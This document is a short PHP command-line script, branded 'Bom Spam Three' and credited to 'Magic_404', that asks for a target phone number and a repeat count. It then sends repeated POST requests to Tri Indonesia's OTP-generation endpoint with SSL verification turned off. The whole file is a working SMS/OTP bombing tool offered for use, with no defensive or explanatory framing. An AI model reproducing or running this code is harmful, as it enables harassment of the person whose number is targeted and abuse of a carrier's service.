<?php
/*
###################################
		Thanks My Freind
###################################
*/
$banner="
   ___             ____                  ________              
  / _ )___  __ _  / __/__  ___ ___ _    /_  __/ /  _______ ___ 
 / _  / _ \/  ' \_\ \/ _ \/ _ `/  ' \    / / / _ \/ __/ -_) -_)
/____/\___/_/_/_/___/ .__/\_,_/_/_/_/   /_/ /_//_/_/  \__/\__/ 
                   /_/                                         
						Coded By Magic_404
							\n";
							echo"$banner";
							echo"Sasaran : ";
							$target=trim(fgets(STDIN));
							echo"limit  : ";
							$waktu=trim(fgets(STDIN));
							$gas=bom($target,$waktu);
							function bom($target,$waktu){
								for($x=0;$x<=$waktu;){
								$ch=curl_init();
								curl_setopt($ch, CURLOPT_URL,"https://registrasi.tri.co.id/daftar/generateOTP");
								curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=".$target);
								curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
								curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
								curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
								curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
								curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
								$server_output = curl_exec ($ch);
								curl_close ($ch);
								$x++;
								$server_output = json_decode($server_output,true);
								if ($server_output['status']) 
								{
								echo "Success";
								}
								else{
								echo"gagal";
								}
							}
							}
?>						